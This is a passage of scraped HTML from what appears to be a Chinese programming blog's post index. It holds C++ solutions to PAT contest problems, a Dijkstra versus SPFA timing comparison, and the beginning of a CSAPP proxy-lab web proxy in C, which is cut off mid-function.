&lt;tr&gt;
&lt;td&gt;右向左&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;最终供奶量&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include &amp;lt;bits/stdc++.h&amp;gt;

using namespace std;

const int NMAX = 10005;
const int WMAX = 205;

int main() {
    int n, wight[NMAX], milk_l[NMAX], milk_r[NMAX];
    cin &amp;gt;&amp;gt; n;
    for (int i = 0; i &amp;lt; n; i++) {
        cin &amp;gt;&amp;gt; wight[i];
    }
    int pre, now_milk;
    now_milk = 2;
    pre = WMAX;
    for (int i = 0; i &amp;lt; n; i++) {
        // 左向右扫
        if (wight[i] &amp;gt; pre) {
            now_milk++;
        } else if (wight[i] == pre) { ; //体重相等供奶量保持不变
        } else {
            now_milk = 2;
        }
        milk_l[i] = now_milk;
        pre = wight[i];
    }

    now_milk = 2;
    pre = WMAX;
    for (int i = n - 1; i &amp;gt;= 0; i--) {
        // 右向左扫
        if (wight[i] &amp;gt; pre) {
            now_milk++;
        } else if (wight[i] == pre) { ;
        } else {
            now_milk = 2;
        }
        milk_r[i] = now_milk;
        pre = wight[i];
    }
    int sum = 0;
    for (int i = 0; i &amp;lt; n; i++) {
        sum += max(milk_l[i], milk_r[i]); // 取较大者
    }
    cout &amp;lt;&amp;lt; sum * 100;
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;至于这题是怎么想到的？我也不知道。可能是考场上的灵光一现吧，要是换个时间再来一次，我可能也想不到这样做了。&lt;/p&gt;
&lt;h3 id=&#34;7-2-how-many-ways-to-buy-a-piece-of-land-25分&#34;&gt;7-2 How Many Ways to Buy a Piece of Land (25分)&lt;/h3&gt;
&lt;p&gt;比较简单&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include &amp;lt;bits/stdc++.h&amp;gt;

using namespace std;

const int NMAX = 10005;

int main() {
    int n, m;
    int pieces[NMAX];
    cin &amp;gt;&amp;gt; n &amp;gt;&amp;gt; m;
    for (int i = 0; i &amp;lt; n; i++) {
        cin &amp;gt;&amp;gt; pieces[i];
    }
    int ans = 0;
    int i = 0, j = 0;
    int total = 0;
    while (i &amp;lt; n) {
        while (j &amp;lt; n &amp;amp;&amp;amp; total + pieces[j] &amp;lt;= m) {
            total += pieces[j++];
        }
        ans += j - i;
        total -= pieces[i++];
    }
    cout &amp;lt;&amp;lt; ans;
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;7-3-left-view-of-binary-tree-25分&#34;&gt;7-3 Left-View of Binary Tree (25分)&lt;/h3&gt;
&lt;p&gt;先建树，再层序遍历，考基本功了&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include &amp;lt;bits/stdc++.h&amp;gt;

using namespace std;

const int NMAX = 25;

struct TNode {
    int val;
    int level;
    TNode *left;
    TNode *right;
};

int pre[NMAX], in[NMAX];

TNode *new_node(int val) {
    TNode *node = new TNode;
    node-&amp;gt;val = val;
    node-&amp;gt;level = -1;
    node-&amp;gt;left = node-&amp;gt;right = nullptr;
    return node;
}

TNode *built_tree(int in_s, int in_e, int pre_s, int pre_e) {
    if (in_s &amp;gt; in_e)
        return nullptr;
    int mid;
    for (mid = in_s; mid &amp;lt;= in_e; mid++) {
        if (in[mid] == pre[pre_s])
            break;
    }

    TNode *node = new_node(pre[pre_s]);
    node-&amp;gt;left = built_tree(in_s, mid - 1, pre_s + 1, pre_s + mid - in_s);
    node-&amp;gt;right = built_tree(mid + 1, in_e, pre_s + mid - in_s + 1, pre_e);
    return node;
}


vector&amp;lt;int&amp;gt; ans;

void level_travel(TNode *node) {
    queue&amp;lt;TNode *&amp;gt; q;
    int now_level = 0;
    node-&amp;gt;level = 1;
    q.push(node);
    while (!q.empty()) {
        node = q.front();
        q.pop();
        if (node-&amp;gt;level != now_level) {
            ans.push_back(node-&amp;gt;val);
            now_level = node-&amp;gt;level;
        }

        if (node-&amp;gt;left) {
            node-&amp;gt;left-&amp;gt;level = node-&amp;gt;level + 1;
            q.push(node-&amp;gt;left);
        }
        if (node-&amp;gt;right) {
            node-&amp;gt;right-&amp;gt;level = node-&amp;gt;level + 1;
            q.push(node-&amp;gt;right);
        }
    }
}

int main() {
    int n;
    cin &amp;gt;&amp;gt; n;
    for (int i = 0; i &amp;lt; n; i++) {
        cin &amp;gt;&amp;gt; in[i];
    }
    for (int i = 0; i &amp;lt; n; i++) {
        cin &amp;gt;&amp;gt; pre[i];
    }
    TNode *root = built_tree(0, n - 1, 0, n - 1);

    level_travel(root);
    int l = ans.size();
    if (l &amp;gt; 0) {
        cout &amp;lt;&amp;lt; ans[0];
    }
    for (int i = 1; i &amp;lt; l; i++) {
        cout &amp;lt;&amp;lt; &amp;quot; &amp;quot; &amp;lt;&amp;lt; ans[i];
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;7-4-professional-ability-test-30分&#34;&gt;7-4 Professional Ability Test (30分)&lt;/h3&gt;
&lt;p&gt;先判断是否有环（推荐拓扑排序，DFS也许），然后djs算法，纯考基本功，代码量有点大&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include &amp;lt;bits/stdc++.h&amp;gt;

using namespace std;

const int NMAX = 1005;
const int MAX_DIS = 500;

struct Edge {
    int v;
    int score, daijinquan;

    Edge() {};

    Edge(int _v, int _score, int _daijinquan) {
        v = _v;
        score = _score;
        daijinquan = _daijinquan;
    }
};

vector&amp;lt;Edge&amp;gt; graph[NMAX];
int in[NMAX], in_buff[NMAX];
int n, m;

void not_consist() {
    // 有环，直接判断
    cout &amp;lt;&amp;lt; &amp;quot;Impossible.&amp;quot; &amp;lt;&amp;lt; endl;
    int k;
    cin &amp;gt;&amp;gt; k;
    while (k--) {
        int node;
        cin &amp;gt;&amp;gt; node;
        if (in[node] == 0)
            printf(&amp;quot;You may take test %d directly.
&amp;quot;, node);
        else
            printf(&amp;quot;Error.
&amp;quot;);
    }
}

//vector&amp;lt;int&amp;gt; pre[NMAX];
int pre[NMAX];

void Dijkstra() {
    bool visited[NMAX];
    int dis_score[NMAX];
    int dis_daijinquan[NMAX];
    fill(visited, visited + NMAX, false);
    fill(dis_score, dis_score + NMAX, MAX_DIS);
    fill(dis_daijinquan, dis_daijinquan + NMAX, 0);
    //dis_score[n]=0;
    //int node;
    for (Edge e:graph[n]) {
        dis_score[e.v] = dis_daijinquan[e.v] = 0;
        pre[e.v] = n;
    }
    while (true) {
        int min_node = n;
        int min_dis = MAX_DIS;
        for (int i = 0; i &amp;lt; n; i++) {
            if (visited[i])
                continue;

            if (dis_score[i] &amp;lt; min_dis) {
                min_dis = dis_score[i];
                min_node = i;
            } else if (dis_score[i] == min_dis) {
                if (dis_daijinquan[i] &amp;gt; dis_daijinquan[min_node])
                    min_node = i;
            }
        }
        if (min_node == n)
            break;
        visited[min_node] = true;
        for (Edge e:graph[min_node]) {
            if (min_dis + e.score &amp;lt; dis_score[e.v]) {
                pre[e.v] = min_node;
                dis_score[e.v] = min_dis + e.score;
                dis_daijinquan[e.v] = dis_daijinquan[min_node] + e.daijinquan;
            } else if (min_dis + e.score == dis_score[e.v]) {
                if (dis_daijinquan[min_node] + e.daijinquan &amp;gt; dis_daijinquan[e.v]) {
                    pre[e.v] = min_node;
                    dis_daijinquan[e.v] = dis_daijinquan[min_node] + e.daijinquan;
                }
            }
        }
    }
}

void consist() {
    // 无环 Djs算法
    cout &amp;lt;&amp;lt; &amp;quot;Okay.&amp;quot; &amp;lt;&amp;lt; endl;
    Dijkstra();
    int k;
    cin &amp;gt;&amp;gt; k;
    for (int i = 0; i &amp;lt; k; i++) {
        int dst;
        cin &amp;gt;&amp;gt; dst;

        if (pre[dst] == n) {
            printf(&amp;quot;You may take test %d directly.
&amp;quot;, dst);
        } else {
            vector&amp;lt;int&amp;gt; path;
            while (dst != n) {
                path.push_back(dst);
                dst = pre[dst];
            }
            int l = path.size();
            printf(&amp;quot;%d&amp;quot;, path[l - 1]);
            for (int j = l - 2; j &amp;gt;= 0; j--) {
                printf(&amp;quot;-&amp;gt;%d&amp;quot;, path[j]);
            }
            printf(&amp;quot;
&amp;quot;);
        }
    }
}

bool check() {
    // 判断是否有环
    bool visited[NMAX];
    fill(visited, visited + NMAX, false);
    for (int i = 0; i &amp;lt; n; i++) {
        int node = 0;
        for (; node &amp;lt; n; node++) {
            if (!visited[node] &amp;amp;&amp;amp; in[node] == 0) {
                break;
            }
        }
        if (node == n)
            break;
        visited[node] = true;
        for (Edge t:graph[node]) {
            in[t.v]--;
        }
    }
    for (int i = 0; i &amp;lt; n; i++) {
        if (in[i])
            return false;
    }
    return true;
}

int main() {

    cin &amp;gt;&amp;gt; n &amp;gt;&amp;gt; m;
    for (int i = 0; i &amp;lt; m; i++) {
        int u, v, s, d;
        cin &amp;gt;&amp;gt; u &amp;gt;&amp;gt; v &amp;gt;&amp;gt; s &amp;gt;&amp;gt; d;
        in[v]++;
        in_buff[v]++;// 入读保存两份，一份用来判环，一份判断是否是启示节点（一开始入读就是0的节点）
        graph[u].push_back(Edge(v, s, d));
    }

    for (int i = 0; i &amp;lt; n; i++) {
        if (in[i] == 0) {
            // 用节点n作为总起始节点，连接所有起始入度为零的节点，将图变成单源的
            graph[n].push_back(Edge(i, 0, 0));
        }
    }
    if (check())
        consist();
    else
        not_consist();
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
">PAT 2020年秋考解答</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/sw67dr_iy8tyk/"" data-c="
          &lt;p&gt;&lt;a href=&#34;https://pintia.cn/problem-sets/994805342720868352/problems/994805472333250560&#34;&gt;题目链接&lt;/a&gt;&lt;br&gt;
题目不难读懂，并且不涉及什么算法，但是逻辑上非常繁琐，算法笔记上有非常详细的题意解释，这里就不赘述了。&lt;/p&gt;
&lt;p&gt;这里主要是写我用的一种模拟时间滴答的方法，逻辑上可能要简单一些。&lt;br&gt;
主要就是将题目中的时间 &lt;code&gt;08:00:00&lt;/code&gt; - &lt;code&gt;21:00:00&lt;/code&gt; 以每秒一个间隔，总共 &lt;code&gt;13*60*60=46800&lt;/code&gt; 个时钟滴答，在每一个始终滴答到来的时候，依次处理玩家到达事件、桌子使用计时减1事件、空桌子安排玩家使用事件。&lt;br&gt;
这样思考总体上逻辑简洁一些。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;具体的看代码&lt;/strong&gt; ：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include&amp;lt;bits/stdc++.h&amp;gt;
using namespace std;
#define MAXPEOPLE 10005
#define MAXTABLE 105
#define TIME2SECOND(h,m,s) ((((h) - 8) * 3600) + ((m) * 60) + (s))
#define MINUTE2SECOND(m) ((m) * 60)
#define MAXTIMESTAMP 46800


int second2minute(int s)
{
	//秒数转分钟，并且舍入
	int m = s / 60;
	if ((s % 60) &amp;gt;= 30)
		m++;
	return m;
}

void printTime(int second)
{
	//根据秒数打印时间
	int h, m, s;
	h = second / 3600 + 8;
	second = second % 3600;
	m = second / 60;
	second = second % 60;
	s = second;
	printf(&amp;quot;%02d:%02d:%02d &amp;quot;, h, m, s);
}

struct People
{
	int arrTime = 0;	//到达时间
	int needTime = 0;	//需要的时间
	int serverTime = -1;	//服务开始时间
	bool VIP = false;		//是否是VIP
	bool servered = false;	//是否已被服务
};

int n, tableNum, viptableNum, minemptytable;	//记录数、桌子总数，vip桌子总数，索引号最小的空桌子的索引
int timeStamp;	//时间戳,8:00:00为0,21:00:00为46800
int serverIndex, arriveIndex;	//当前未服务玩家的索引、当前可服务玩家索引  [serverIndex,arriveIndex)为当前时间
								//可服务但尚未服务的玩家
queue&amp;lt;int&amp;gt; VIPwaitIndex;		//在等待中的vip玩家
People playpairs[MAXPEOPLE];	//玩家记录
int tables[MAXTABLE] = { 0 };	//当前桌子还要用多久，0代表空桌子

bool isVIP[MAXTABLE] = { false };	//记录桌子是不是VIP桌
int serverNum[MAXTABLE] = { 0 };	//每个桌子服务过的人数
vector&amp;lt;int&amp;gt; VIPtable;		//记录vip桌子的索引

void dealServerIndex();
void handelTableUse()
{
	//在每一个时钟滴答到来时，将正在使用的桌子的使用时间减少1，如果减少后为0，则该桌子为空，考虑更新minemptytable
	int i;
	for (i = 0; i &amp;lt; tableNum; i++) {
		if (tables[i] &amp;gt; 0)
			tables[i]--;
		if (tables[i] == 0)
			if (i &amp;lt; minemptytable)	//考虑更新minemptytable
				minemptytable = i;
	}
}

void serverPeople(int peopleIndex, int tableIndex)
{
	//服务playpairs中索引号为peopleIndex的玩家，使用的桌子为tableIndex
	playpairs[peopleIndex].servered = true;	//标记已服务
	playpairs[peopleIndex].serverTime = timeStamp;	//记录服务时间
	tables[tableIndex] = playpairs[peopleIndex].needTime;	//开始桌子时间的倒计时
	serverNum[tableIndex]++;	//记录该桌子的服务人数
	while (minemptytable &amp;lt; tableNum &amp;amp;&amp;amp; tables[minemptytable]&amp;gt;0) {
		//更新minemptytable，这里一定要用while，因为空桌子不是连续的
		minemptytable++;
	}
	dealServerIndex();
}

void dealServerIndex()
{
	//更新待服务玩家索引serverIndex，这里一定要用while，因为可能存在有的玩家因为VIP插队的原因已经被服务了
	while (playpairs[serverIndex].servered) {
		serverIndex++;
	}
}

void dealVIPtable()
{
	//处理空的VIP专属桌子
	for (int t : VIPtable) {
		if (tables[t] == 0 &amp;amp;&amp;amp; !VIPwaitIndex.empty()) {
			//桌子为空且有VIP玩家在等待，则服务这个玩家
			int p = VIPwaitIndex.front();
			VIPwaitIndex.pop();
			serverPeople(p, t);
		}
	}
}

void handelEmptyTable()
{
	//在每一个时钟滴答，把桌子的使用倒计时-1后，处理所有的空桌子
	dealVIPtable();	//首先处理VIP桌子，因为如果等待队列中的第一人是VIP，
					//且同时存在VIP桌子和普通桌子时，优先选择VIP桌子

	//按序处理所有空桌子
	while (minemptytable &amp;lt; tableNum &amp;amp;&amp;amp; serverIndex &amp;lt; arriveIndex) {
		if (playpairs[serverIndex].VIP) {
			//如果排在第一的是一个VIP玩家，则他一定没有VIP桌子可用了，所以他用了一个普通桌子，
			//因此不会在dealVIPtable()中出对，故要移出VIP等待队列
			VIPwaitIndex.pop();
		}
		serverPeople(serverIndex, minemptytable);
	}
}

void handelPeopleArrive()
{
	//在每一个时钟滴答，如果到了下一个玩家到来的时间，就将arriveIndex++，代表到达了
	//一个新的玩家，并考虑他是不是VIP，是则加入VIP等待队列
	if (playpairs[arriveIndex].arrTime == timeStamp) {
		if (playpairs[arriveIndex].VIP) {
			VIPwaitIndex.push(arriveIndex);
		}
		arriveIndex++;
	}
}

int main() {
	int h, m, s, i, need, tag;
	scanf(&amp;quot;%d&amp;quot;, &amp;amp;n);
	for (i = 0; i &amp;lt; n; i++) {
		//玩家信息输入
		scanf(&amp;quot;%d:%d:%d %d %d&amp;quot;, &amp;amp;h, &amp;amp;m, &amp;amp;s, &amp;amp;need, &amp;amp;tag);
		if (need &amp;gt; 120) {
			need = 120;
		}
		playpairs[i].arrTime = TIME2SECOND(h, m, s);
		playpairs[i].needTime = MINUTE2SECOND(need);
		if (tag == 1)
			playpairs[i].VIP = true;
	}
	scanf(&amp;quot;%d %d&amp;quot;, &amp;amp;tableNum,&amp;amp;viptableNum);
	for (i = 0; i &amp;lt; viptableNum; i++) {
		//桌子信息输入
		int v;
		scanf(&amp;quot;%d&amp;quot;, &amp;amp;v);
		VIPtable.push_back(--v);	//将桌子索引转为0开始
		isVIP[v] = true;
	}

	//按照玩家到达时间升序排列
	sort(playpairs, playpairs + n, [](People&amp;amp; a, People&amp;amp; b) {return a.arrTime &amp;lt; b.arrTime; });

	serverIndex = 0;
	minemptytable = 0;
	arriveIndex = 0;
	for (timeStamp = 0; timeStamp &amp;lt; MAXTIMESTAMP; timeStamp++) {
		//每一个时间戳，首先处理玩家到达事件，再处理桌子使用计时减1事件，最后处理
		//空桌子使用事件，三者的顺序不能颠倒
		handelPeopleArrive();
		handelTableUse();
		handelEmptyTable();
		if (serverIndex == arriveIndex == n)	
			//所有玩家都已经服务了
			break;
	}

	for (i = serverIndex; i &amp;lt; arriveIndex; i++) {
		//在[serverIndex,arriveIndex)中，可能存在因为VIP插队而已被服务的玩家，故要
		//把该玩家提前，这样最后在[0,serverIndex)中的就是全部服务过的玩家
		if (playpairs[i].servered) {
			playpairs[serverIndex++] = playpairs[i];
		}
	}

	//根据服务时间升序排列
	sort(playpairs, playpairs + serverIndex, [](People&amp;amp; a, People&amp;amp; b) {return a.serverTime &amp;lt; b.serverTime; });
	
	//答案输出
	for (i = 0; i &amp;lt; serverIndex; i++) {
		printTime(playpairs[i].arrTime);
		printTime(playpairs[i].serverTime);
		printf(&amp;quot;%d\n&amp;quot;, second2minute(playpairs[i].serverTime - playpairs[i].arrTime));
	}
	printf(&amp;quot;%d&amp;quot;, serverNum[0]);
	for (i = 1; i &amp;lt; tableNum; i++) {
		printf(&amp;quot; %d&amp;quot;, serverNum[i]);
	}

	return 0;
}


/*
//input
2
08:00:00 10 1
08:05:00 10 1
3 2
2 3

//output
08:00:00 08:00:00 0
08:05:00 08:05:00 0
0 1 1
*/


/*
//input
2
20:00:00 60 0
20:30:00 10 1
1 1
1

//output
20:00:00 20:00:00 0
1
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最下面是算法笔记上给出的几组测试数据。&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_fd5b180732b660f13e5fc326933e6bb1.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
这种方法虽然外层循环有46800次，但是内层大部分时间只是一个简单的判断，没有实际操作，所以耗时并不高。&lt;/p&gt;
">PAT1026 Table Tennis (30分)时间戳法</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/sw67dr_hpnu4t/"" data-c="
          &lt;p&gt;最近看了《算法笔记》上面关于最短路径的部分，学习了一种之前没见过的算法：&lt;strong&gt;SPFA。&lt;/strong&gt;&lt;br&gt;
理论上SPFA算法会比Dijkstra快，顾而找了一题测试一下。&lt;br&gt;
使用PAT A1072题，因为这题求&lt;strong&gt;最短路径的部分很单纯，没有其他的权，而且测试点的复杂度够高，能够看出时间上的差别。&lt;/strong&gt;&lt;br&gt;
&lt;a href=&#34;https://pintia.cn/problem-sets/994805342720868352/problems/994805396953219072&#34;&gt;题目链接&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;速度对比重点看测试点4&#34;&gt;速度对比（重点看测试点4）&lt;/h2&gt;
&lt;h3 id=&#34;dijkstra速度&#34;&gt;Dijkstra速度&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;http://static.yulan.net.cn/image/image_3dfbda0886ef9d9aefa1315db1cb7f78.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;spfa&#34;&gt;SPFA&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;http://static.yulan.net.cn/image/image_78d365c8596c6ebefa6224fa455883c0.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
多次提交对比，Dijkstra算法都在50ms左右，而SPFA一直在10ms左右，可见SPFA确实比Dijkstra快不少，而且思路也不复杂，以后可以多多使用。&lt;/p&gt;
&lt;h2 id=&#34;代码如下&#34;&gt;代码如下&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include&amp;lt;bits/stdc++.h&amp;gt;
#include&amp;lt;unordered_map&amp;gt;
using namespace std;
#define MAXNODE 1015
#define INF 0x3ffffff
#define G2index(G) ((n)+(G))
#define index2G(index) ((index)-(G))

struct Node
{
	int v, dis;//目标与距离
};

int dis[MAXNODE];
int n, m, k, dmax;
bool used[MAXNODE], inqueue[MAXNODE];
vector&amp;lt;Node&amp;gt; graph[MAXNODE];

void Dijkstra(int start)
{
	fill(dis, dis + MAXNODE, INF);
	fill(used, used + MAXNODE, false);
	dis[start] = 0;

	for (int i = 0; i &amp;lt; n + m - 1; i++) {
		int minnode = -1, mindis = INF;
		for (int j = 1; j &amp;lt;= n + m; j++) {
			if (!used[j] &amp;amp;&amp;amp; dis[j] &amp;lt; mindis) {
				minnode = j;
				mindis = dis[j];
			}
		}
		if (minnode == -1)
			return;

		used[minnode] = true;
		int tdis = dis[minnode];
		for (Node node : graph[minnode]) {
			if (tdis + node.dis &amp;lt; dis[node.v]) {
				dis[node.v] = tdis + node.dis;
			}
		}
	}
}

void SPFA(int start)
{
	fill(dis, dis + MAXNODE, INF);
	fill(inqueue, inqueue + MAXNODE, false);
	dis[start] = 0;

	int tdis = 0;
	queue&amp;lt;int&amp;gt; q;
	for (Node node : graph[start]) {
		if (tdis + node.dis &amp;lt; dis[node.v]) {
			dis[node.v] = node.dis + tdis;
			q.push(node.v);
			inqueue[node.v] = true;
		}
	}
	while (!q.empty()) {
		int nodeid = q.front();
		q.pop();
		inqueue[nodeid] = false;
		for (Node node : graph[nodeid]) {
			tdis = dis[nodeid];
			if (tdis + node.dis &amp;lt; dis[node.v]) {
				dis[node.v] = node.dis + tdis;
				if (!inqueue[node.v]) {
					q.push(node.v);
					inqueue[node.v] = true;
				}
			}
		}
	}
}

struct Ans
{
	int Gid, mindis, totaldis;
};
vector&amp;lt;Ans&amp;gt; ans;

void getans(int Gid)
{
	int totaldis, mindis;
	mindis = INF;
	totaldis = 0;
	for (int i = 1; i &amp;lt;= n; i++) {
		if (dis[i] &amp;gt; dmax)
			return;
		if (dis[i] &amp;lt; mindis) {
			mindis = dis[i];
		}
		totaldis += dis[i];
	}
	ans.push_back(Ans{ Gid,mindis,totaldis });
}

int main() {
	scanf(&amp;quot;%d%d%d%d&amp;quot;, &amp;amp;n, &amp;amp;m, &amp;amp;k, &amp;amp;dmax);
	for (int i = 0; i &amp;lt; k; i++) {
		int c1, c2, dd;
		char cs1[10], cs2[10];
		scanf(&amp;quot;%s%s%d&amp;quot;, cs1, cs2, &amp;amp;dd);
		if (cs1[0] == &#39;G&#39;) {
			c1 = G2index(atoi(cs1 + 1));
		}
		else {
			c1 = atoi(cs1);
		}

		if (cs2[0] == &#39;G&#39;) {
			c2 = G2index(atoi(cs2 + 1));
		}
		else {
			c2 = atoi(cs2);
		}
		graph[c1].push_back(Node{ c2, dd });
		graph[c2].push_back(Node{ c1, dd });
	}
	for (int i = 1; i &amp;lt;= m; i++) {
		//Dijkstra(G2index(i));
		SPFA(G2index(i));
		getans(i);
	}

	Ans myans;
	myans.Gid = -1;
	myans.totaldis = INF;
	myans.mindis = 0;
	for (Ans a : ans) {
		if (a.mindis &amp;gt; myans.mindis)
			myans = a;
		else if (a.mindis == myans.mindis) {
			if (a.totaldis &amp;lt; myans.totaldis)
				myans = a;
		}
	}
	if (myans.Gid == -1) {
		printf(&amp;quot;No Solution&amp;quot;);
		return 0;
	}
	printf(&amp;quot;G%d\n%.1lf %.1lf&amp;quot;, myans.Gid, (double)myans.mindis, (double)myans.totaldis / n);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;代码思路就不写了，大家可以看算法笔记。&lt;/p&gt;
">Dijkstra算法与SPFA算法</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/uscxh7_cwdngk/"" data-c="
          &lt;p&gt;这是本书的最后一个lab了，但总体上没有前面的malloclab和shelllab难，好好看书，多多参考tinyweb的代码，还是比较容易写出来的。&lt;/p&gt;
&lt;h2 id=&#34;代码&#34;&gt;代码&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;quot;csapp.h&amp;quot;

/* Recommended max cache and object sizes */
#define MAX_CACHE_SIZE 1049000
#define MAX_OBJECT_SIZE 102400
#define MMAXLINE 2048
#define MAXHEADER 4096
#define MAXCACHEBLOCK 50

struct cache_block
{
    char header[MAXHEADER];
    char path[MMAXLINE];
    char *body;
    int body_size;
    char visit;
};

struct _cache
{
    struct cache_block *block_slot[MAXCACHEBLOCK];
    int clock_p;
    int used_size;
    int used_block;
} cache;

int read_cnt;
sem_t mutex, write_lock;

/* You won&#39;t lose style points for including this long line in your code */
static const char *user_agent_hdr = &amp;quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3&amp;quot;;

void doit(int connfd);
void request_back_server(rio_t *rio_buf, char *host, char *port, char *path, char *real_path);
void http_error(int fd, char *errnum, char *msg);
int parse_request(char *request, char *host, char *port, char *path);
void deal_request_header(char *header_line, int back_server_fd);
void get_back_response_and_send_to_client(int fd_conn_back_server, int client_fd, char *path);
void html_error(int fd, char *msg);
void *thread(void *vargp);
void init_cache();
int read_cache(char *header, char *body, char *real_path);
int write_cache(char *header, char *body, int body_size, char *real_path);
int next_slot(int need_size);
void evict();

int main(int argc, char **argv)
{
    //printf(&amp;quot;%s
&amp;quot;, user_agent_hdr);
    int listenfd, connfd;
    pthread_t tid;
    int *vargs = NULL;
    socklen_t clientlen;
    struct sockaddr_storage clientaddr;
    /* Check command line args */
    if (argc != 2)
    {
        fprintf(stderr, &amp;quot;usage: %s &amp;lt;port&amp;gt;
&amp;quot;, argv[0]);
        exit(1);
    }

    init_cache();
    listenfd = Open_listenfd(argv[1]);
    while (1)
    {
        clientlen = sizeof(clientaddr);
        connfd = Accept(listenfd, (SA *)&amp;amp;clientaddr, &amp;amp;clientlen);
        //doit(connfd);

        if ((vargs = (int *)malloc(sizeof(int))) == NULL)
        {
            http_error(connfd, &amp;quot;500&amp;quot;, &amp;quot;not enough memory!&amp;quot;);
            Close(connfd);
        }
        else
        {
            *vargs = connfd;
            pthread_create(&amp;amp;tid, NULL, thread, (void *)vargs);
        }
    }
}

void *thread(void *vargp)
{
    int connfd = *((int *)vargp);
    pthread_detach(pthread_self());
    free(vargp);
    doit(connfd);
    Close(connfd);
    return NULL;
}

void doit(int connfd)
{
    rio_t Riobuf;
    char req_buf[MMAXLINE], host[MMAXLINE], port[MMAXLINE], path[MMAXLINE], real_path[MAXLINE];
    char *header, *body;
    int body_size;
    rio_readinitb(&amp;amp;Riobuf, connfd);
    if (!rio_readlineb(&amp;amp;Riobuf, req_buf, MMAXLINE))
        return;

    if (parse_request(req_buf, host, port, path) &amp;lt; 0)
        http_error(connfd, &amp;quot;403&amp;quot;, &amp;quot;Unknown request&amp;quot;);
    else
    {
        sprintf(real_path, &amp;quot;%s:%s%s&amp;quot;, host, port, path);
        header = (char *)malloc(MAXHEADER);
        body = (char *)malloc(MAX_OBJECT_SIZE);
        if (header != NULL &amp;amp;&amp;amp; body != NULL)
        {
            if ((body_size = read_cache(header, body, real_path)) &amp;gt;= 0)
            {
                Rio_writen(connfd, header, strlen(header));
                Rio_writen(connfd, &amp;quot;
&amp;quot;, strlen(&amp;quot;
&amp;quot;));
                Rio_writen(connfd, body, body_size);
                free(header);
                free(body);
                return;
            }
        }
        free(header);
        free(body);
        request_back_server(&amp;amp;Riobuf, host, port, path, real_path);
    }
}

/*根据第一行的请求解析出host，port与请求path，正确返回0，出错返回-1*/
int parse_request(char *request, char *host, char *port, char *path)
{
    char method[MMAXLINE], path_buf[MMAXLINE], version[MMAXLINE], host_buf[MMAXLINE], port_buf[MMAXLINE];
    char *i, *host_buf_p, *port_buf_p;
    int have_port = 1;
    memset(path_buf, 0, MMAXLINE);
    sscanf(request, &amp;quot;%s %s %s&amp;quot;, method, path_buf, version);
    if (strcmp(method, &amp;quot;GET&amp;quot;))
        return -1;
    i = path_buf;
    host_buf_p = host_buf;
    port_buf_p = port_buf;
    while (*i != &#39;/&#39; &amp;amp;&amp;amp; *i != &#39;&#39;)
        i++;
    if (*i != &#39;&#39;)
        i++;
    if (*i != &#39;&#39;)
        i++;
    while (*i != &#39;:&#39; &amp;amp;&amp;amp; *i != &#39;&#39;)
    {
        if (*i == &#39;/&#39;)
        {
            have_port = 0;
            break;
        }
        *host_buf_p++ = *i++;
    }
    *host_buf_p = &#39;&#39;;
    if (!have_port)
    {
        sprintf(port_buf_p, &amp;quot;80&amp;quot;);
    }
    else
    {
        i++;
        while (*i != &#39;/&#39; &amp;amp;&amp;amp; *i != &#39;&#39;)
        {
            *port_buf_p++ = *i++;
        }
        *port_buf_p = &#39;&#39;;
    }

    if (*i == &#39;&#39;)
        return -1;

    sprintf(host, &amp;quot;%s&amp;quot;, host_buf);
    sprintf(port, &amp;quot;%s&amp;quot;, port_buf);
    sprintf(path, &amp;quot;%s&amp;quot;, i);
    //sprintf(request, &amp;quot;%s %s %s
&amp;quot;, method, i, &amp;quot;HTTP/1.0&amp;quot;);
